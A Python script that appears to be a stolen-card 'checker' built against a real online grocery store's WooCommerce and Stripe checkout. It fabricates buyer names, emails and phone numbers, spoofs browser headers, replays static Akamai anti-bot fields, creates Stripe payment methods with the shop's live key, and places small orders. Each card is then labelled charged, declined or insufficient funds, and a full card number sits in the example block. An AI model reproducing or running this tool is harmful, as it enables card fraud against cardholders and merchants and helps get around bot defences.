# Charge1.py - Blemart Checkout (Bacola Theme AJAX + Stripe PM + WC Checkout)
# NOTE: Very likely to fail due to Cloudflare / Akamai Bot Manager (ak_ fields)

import requests
import re
import json
import random
import string
import time
from urllib.parse import quote_plus
from bs4 import BeautifulSoup # To scrape nonces

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))
def generate_first_name(length=7):
    first_names_list = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole", "Nicholas", "Anthony", "Heather", "Eric", "Elizabeth", "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Abigail", "Madison", "Charlotte", "Liam", "Noah", "Jacob", "Ethan", "Alexander", "William", "Benjamin", "Lucas", "Henry"]
    return random.choice(first_names_list)
def generate_last_name(length=9):
    last_names_list = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Carter"]
    return random.choice(last_names_list)
def generate_email_username(first, last, length=4):
    num = generate_random_string(length, string.digits); sep = random.choice(['.', '_', '']); return f"{first.lower()}{sep}{last.lower()}{num}"
def generate_phone(length=10): # US format seems expected based on snippets
    return f"{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
# --- End Generation ---

def BlemartCheckout(ccx):
    """
    Attempts checkout on blemart.com.
    Uses static anti-bot field values - VERY LIKELY TO FAIL.

    Args: ccx (str): Card details "NUMBER|MM|YY|CVC".
    Returns: str: Status message.
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip(); parts = ccx.split("|")
        if len(parts) != 4: return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        n, mm, yy, cvc = parts
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()): return "Error: Card parts must be numeric"
        if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
        elif len(yy) != 2: return f"Error: Invalid year format: {yy}. Use YY or 20YY."
        mm = mm.zfill(2); n_no_spaces = n.replace(' ', '')
    except Exception as parse_e: return f"Error parsing card details: {parse_e}"

    # --- Session and User Data ---
    session = requests.Session()
    # Using Linux Desktop UA from snippet
    ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
    session.headers.update({
        'User-Agent': ua,
        'accept': '*/*', # Default accept for AJAX
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0', # From snippet
        'sec-ch-ua-platform': '"Linux"', # From snippet
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-requested-with': 'XMLHttpRequest',
    })

    first_name = generate_first_name(); last_name = generate_last_name()
    email_user_part = generate_email_username(first_name, last_name)
    email_domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"])
    email = f"{email_user_part}@{email_domain}"
    full_name = f"{first_name} {last_name}"
    phone = generate_phone()

    # Use US Address from snippets
    street = "Street 27"; city = "New York"; state = "NY"; postal_code = "10080"; country = "US"

    # Product and Site Info
    product_id = '9952' # Obiji Pepper Soup Spice
    product_page_url = 'https://blemart.com/product/obiji-pepper-soup-spice-6-oz/'
    ajax_url = 'https://blemart.com/' # Base URL for AJAX
    # Checkout page has '-2' suffix in snippet, might be dynamic or specific state
    checkout_url = 'https://blemart.com/checkout-2/'
    stripe_pk = 'pk_live_51KWu6SIi7Gj2exx3u91CKO3ZNKwKFbqkGRSB5rpJwXbWd0qplqZMJZ57IQfCbrYzYCO19YrkaNXgfsNVhojfV3Rb00DJ3IvIe9'
    stripe_account = 'acct_1KWu6SIi7Gj2exx3'

    # --- Akamai/Anti-Bot Fields (Static values from snippet - LIKELY TO FAIL) ---
    ak_fields = {
        'ak_bib': '', 'ak_bfs': '1745844301930', 'ak_bkpc': '0', 'ak_bkp': '',
        'ak_bmc': '7;9,11523;', 'ak_bmcc': '2', 'ak_bmk': '', 'ak_bck': '',
        'ak_bmmc': '0', 'ak_btmc': '0', 'ak_bsc': '0', 'ak_bte': '78;1,11456;',
        'ak_btec': '2', 'ak_bmm': '',
    }

    try:
        # --- Step 0: Visit Product Page (Attempt to bypass basic CF/Set cookies) ---
        visit_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'none', # Initial visit
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            # Use UA from session
        }
        try:
            r_visit = session.get(product_page_url, headers=visit_headers, timeout=20)
            # Cloudflare often returns 403 if challenge fails
            if r_visit.status_code == 403: return "Error: Step 0 Failed - Cloudflare Block (403)"
            r_visit.raise_for_status()
            # Look for Cloudflare cookies
            cf_clearance = session.cookies.get('cf_clearance')
            cf_bm = session.cookies.get('__cf_bm')
            # No guarantee these cookies are sufficient without JS challenge solution
            time.sleep(random.uniform(1.0, 2.0)) # Pause
        except requests.exceptions.RequestException as e: return f"Error: Step 0 Failed - Visit product page: {e}"

        # --- Step 1: Add Product to Cart (Theme AJAX + Static AK Fields) ---
        add_cart_headers = { 'authority': 'blemart.com', 'origin': 'https://blemart.com', 'referer': product_page_url }
        add_cart_params = { 'wc-ajax': 'bacola_add_to_cart' } # Bacola theme AJAX action
        # Build multipart data including static ak_ fields
        add_cart_files_data = {
            'quantity': (None, '1'),
            'add-to-cart': (None, product_id),
            **{name: (None, value) for name, value in ak_fields.items()} # Add static ak_ fields
        }
        try:
            # Make sure session headers (like UA) are used
            session.headers.update(add_cart_headers)
            r_cart = session.post(ajax_url, params=add_cart_params, files=add_cart_files_data, timeout=20)
            if r_cart.status_code == 403: return "Error: Step 1 Failed - Add to Cart Blocked (403)"
            # Sometimes servers return 5xx if anti-bot fields are wrong
            if r_cart.status_code >= 500: return f"Error: Step 1 Failed - Server Error ({r_cart.status_code}) (Likely bad AK fields)"
            r_cart.raise_for_status()
        except requests.exceptions.RequestException as e: return f"Error: Step 1 Failed - Add to Cart AJAX: {e}"
        except Exception as e: return f"Error: Step 1 Failed - Add to Cart Processing: {e}"

        # --- Step 2: Fetch Checkout Page for Nonce ---
        checkout_nonce = None
        get_checkout_headers = { 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'referer': ajax_url, 'upgrade-insecure-requests': '1', }
        try:
            # Update session headers for this specific request
            session.headers.update(get_checkout_headers)
            response_get_checkout = session.get(checkout_url, timeout=20)
            if response_get_checkout.status_code == 403: return "Error: Step 2 Failed - Checkout Page Blocked (403)"
            response_get_checkout.raise_for_status()
            soup = BeautifulSoup(response_get_checkout.text, 'lxml')
            nonce_input = soup.find('input', {'id': 'woocommerce-process-checkout-nonce'}) or soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
            if nonce_input and nonce_input.get('value'): checkout_nonce = nonce_input['value']
            else: # Regex fallback
                nonce_match = re.search(r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\'](\w+)["\']', response_get_checkout.text)
                if nonce_match: checkout_nonce = nonce_match.group(1)
            time.sleep(random.uniform(0.6, 1.2))
        except requests.exceptions.RequestException as e: return f"Error: Step 2 Failed - Fetching Checkout page: {e}"
        except Exception as e: return f"Error: Step 2 Failed - Parsing Checkout page: {e}"

        # --- Step 3: Create Stripe Payment Method ---
        pm_url = 'https://api.stripe.com/v1/payment_methods'
        pm_headers = { 'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua, } # Use base UA
        guid_s = f'guid_{generate_random_string(32)}'; muid_s = session.cookies.get('__stripe_mid', f'mid_{generate_random_string(32)}'); sid_s = session.cookies.get('__stripe_sid', f'sid_{generate_random_string(32)}')
        pm_data_dict = {
            'type': 'card', 'billing_details[name]': full_name,
            'billing_details[address][city]': city, 'billing_details[address][country]': country,
            'billing_details[address][line1]': street, 'billing_details[address][postal_code]': postal_code,
            'billing_details[address][state]': state, 'billing_details[email]': email, 'billing_details[phone]': phone,
            'card[number]': n_no_spaces, 'card[cvc]': cvc, 'card[exp_month]': mm, 'card[exp_year]': yy,
            'guid': guid_s, 'muid': muid_s, 'sid': sid_s, 'pasted_fields': 'number', # from snippet
            'payment_user_agent': 'stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; card-element', # from snippet
            'referrer': quote_plus('https://blemart.com'), # from snippet
            'time_on_page': random.randint(50000, 90000),
            'key': stripe_pk, '_stripe_account': stripe_account, '_stripe_version': '2022-08-01'
        }
        pm_data_encoded = '&'.join([f"{key}={quote_plus(str(value))}" for key, value in pm_data_dict.items()])
        pm_id = None
        try:
            response_pm = session.post(pm_url, headers=pm_headers, data=pm_data_encoded, timeout=25)
            if response_pm.status_code == 402:
                 try:
                     msg = response_pm.json().get('error', {}).get('message', "Stripe Error: Card declined (402)"); msg_lower = msg.lower()
                     if 'insufficient_funds' in msg_lower: return "Insufficient funds."
                     if 'incorrect_cvc' in msg_lower or 'invalid_cvc' in msg_lower: return "Your card's security code is incorrect."
                     if 'expired_card' in msg_lower: return "Your card has expired."
                     if 'postal_code' in msg_lower: return "Declined (AVS - Postal Code)"
                     if 'address' in msg_lower: return "Declined (AVS - Address)"
                     if 'card was declined' in msg_lower or 'generic_decline' in msg_lower: return "Your card was declined."
                     return f"Declined ({msg})"
                 except Exception: return "Error: Stripe card declined (HTTP 402 - Non-JSON Response)"
            response_pm.raise_for_status()
            pm_json = response_pm.json(); pm_id = pm_json.get('id')
            if not pm_id: err_msg = pm_json.get('error', {}).get('message', 'PM ID missing'); return f"Error: Step 3 Failed - {err_msg}"
        except requests.exceptions.RequestException as e: return f"Error: Step 3 Failed - Stripe PM network request: {e}"
        except json.JSONDecodeError: return f"Error: Step 3 Failed - Decoding Stripe PM JSON response"
        except Exception as e: return f"Error: Step 3 Failed - Creating Stripe PM: {e}"

        # --- Step 4: Process Checkout ---
        checkout_ajax_url = 'https://blemart.com/'
        checkout_headers = { 'authority': 'blemart.com', 'accept': 'application/json, text/javascript, */*; q=0.01', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://blemart.com', 'referer': checkout_url, 'x-requested-with': 'XMLHttpRequest', 'user-agent': ua, }
        checkout_params = { 'wc-ajax': 'checkout' }
        checkout_data_dict = {
            'wc_order_attribution_source_type': 'typein', 'wc_order_attribution_referrer': '(none)', 'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_user_agent': ua, # Simplified attribution
            'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_company': '', 'billing_country': country, 'billing_address_1': street, 'billing_address_2': '', 'billing_city': city, 'billing_state': state, 'billing_postcode': postal_code, 'billing_phone': phone, 'billing_email': email,
            'account_password': '', # Not creating account
            'shipping_first_name': '', 'shipping_last_name': '', 'shipping_company': '', 'shipping_country': country, 'shipping_address_1': '', 'shipping_address_2': '', 'shipping_city': '', 'shipping_state': 'TX', 'shipping_postcode': '', # Empty shipping from snippet, state TX? Use billing instead? Let's try empty first.
            'order_comments': '', 'shipping_method[0]': 'wc-shippo-shipping:usps_ground_advantage', # From snippet, might need update
            'payment_method': 'stripe_cc', 'stripe_cc_token_key': pm_id, # Crucial part
            'stripe_cc_payment_intent_key': '', 'stripe_applepay_token_key': '', 'stripe_applepay_payment_intent_key': '', 'stripe_payment_request_token_key': '', 'stripe_payment_request_payment_intent_key': '', # Empty fields from snippet
            'terms': 'on', 'terms-field': '1', 'woocommerce-process-checkout-nonce': checkout_nonce, '_wp_http_referer': '/?wc-ajax=update_order_review',
            '_mc4wp_subscribe_woocommerce': '0' # Mailchimp opt-out from snippet
        }
        checkout_data_encoded = '&'.join([f"{key}={quote_plus(str(value))}" for key, value in checkout_data_dict.items()])
        try:
            response_checkout = session.post(checkout_ajax_url, params=checkout_params, headers=checkout_headers, data=checkout_data_encoded, timeout=40)
            # Check for Cloudflare blocks / other errors
            if response_checkout.status_code == 403: return "Error: Step 4 Failed - Checkout Blocked (403)"
            if response_checkout.status_code >= 500: return f"Error: Step 4 Failed - Server Error ({response_checkout.status_code})"
            # Parse response
            try:
                result = response_checkout.json()
                if result.get('result') == 'success':
                    redirect_url = result.get('redirect', '')
                    if any(kw in redirect_url.lower() for kw in ["confirm", "_secret", "verify", "authenticate", "challenge", "three_d_secure"]): return "3DS/Action Required"
                    return "Charged" # Amount $4.99 attempted
                elif result.get('result') == 'failure':
                    messages_html = result.get('messages', ''); messages_text = re.sub('<[^<]+?>', ' ', messages_html).strip().replace('\n', ' ').lower()
                    if 'invalid payment method' in messages_text: return "Declined (Invalid Payment Method)"
                    if 'session expired' in messages_text: return "Declined (Session Expired)"
                    if 'nonce incorrect' in messages_text or 'nonce validation failed' in messages_text: return "Declined (Invalid Nonce)"
                    if 'insufficient funds' in messages_text: return "Insufficient funds."
                    if 'incorrect card number' in messages_text: return "Your card number is incorrect."
                    if 'security code is incorrect' in messages_text or 'invalid cvc' in messages_text: return "Your card's security code is incorrect."
                    if 'card has expired' in messages_text: return "Your card has expired."
                    if 'postal code is invalid' in messages_text: return "Declined (AVS - Postal Code)"
                    if 'address is invalid' in messages_text: return "Declined (AVS - Address)"
                    if 'card was declined' in messages_text: return "Your card was declined."
                    if messages_text: return f"Declined ({messages_text[:100]}{'...' if len(messages_text)>100 else ''})"
                    else: return "Declined (Checkout Failed, Reason Unknown)"
                else: return f"Unknown Checkout JSON Response: {str(result)[:150]}..."
            except json.JSONDecodeError:
                html_text = response_checkout.text.lower()
                if 'order received' in html_text or 'thank you' in html_text: return "Charged (HTML Success Page)" # Amount $4.99 attempted
                if 'cloudflare' in html_text: return "Error: Step 4 Failed - Cloudflare block on checkout submit"
                return f"Non-JSON Checkout Response (Status {response_checkout.status_code}): {response_checkout.text[:100]}..."
        except requests.exceptions.Timeout: return "Error: Step 4 Failed - Timeout during Checkout"
        except requests.exceptions.RequestException as e: status = getattr(e.response, 'status_code', None); return f"Error: Step 4 Failed - Network error during Checkout (HTTP {status or 'N/A'})"
        except Exception as e: return f"Error: Step 4 Failed - Unexpected error during Checkout: {e}"

    # --- Global Exception Catcher ---
    except Exception as e:
        import traceback; print(f"Unexpected error in BlemartCheckout: {e}"); traceback.print_exc()
        return f"Error: Unexpected critical gateway error: {str(e)}"

# --- Example Usage Block ---
if __name__ == "__main__":
    test_cc = "5598880397646656|06|31|677" # <<< PUT A VALID TEST CARD HERE
    if "TEST_CARD_HERE" in test_cc: print("Please replace 'VISA_OR_MC_TEST_CARD_HERE' with an actual card number for testing.")
    else: print(f"Attempting checkout for: {test_cc.split('|')[0][:4]}********"); result = BlemartCheckout(test_cc); print("\n--- Checkout Result (Blemart v1.0) ---"); print(result); print("--- End of Result ---")